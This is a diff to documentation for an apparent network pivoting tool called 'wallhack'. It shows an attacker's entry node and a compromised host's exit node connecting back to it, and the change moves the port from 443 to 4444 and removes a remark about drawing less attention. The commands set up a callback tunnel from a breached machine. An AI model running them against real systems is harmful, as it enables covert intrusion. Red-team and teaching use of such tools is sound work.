@@ -14,15 +14,15 @@ The binary reached the host via initial access — a web shell, RCE exploit, or 
 
 {% steps %}
 {% step title="Attacker (10.0.0.5)" number=1 %}
-An [entry node](/concepts) listening on port 443. The default transport is QUIC, which uses UDP. Port 443 is chosen here as it is the standard HTTPS port and less likely to draw attention.
+An [entry node](/concepts) listening for incoming connections. The default transport is QUIC (UDP).
 
-{% codeblock code="wallhack entry --listen :443" /%}
+{% codeblock code="wallhack entry --listen :4444" /%}
 {% /step %}
 
 {% step title="Compromised Host (10.0.1.5)" number=2 %}
-An [exit node](/concepts) connecting back to the entry node on port 443.
+An [exit node](/concepts) connecting back to the entry node.
 
-{% codeblock code="wallhack exit --connect 10.0.0.5:443" /%}
+{% codeblock code="wallhack exit --connect 10.0.0.5:4444" /%}
 {% /step %}
 
 {% step title="Configure Routes" number=3 %}
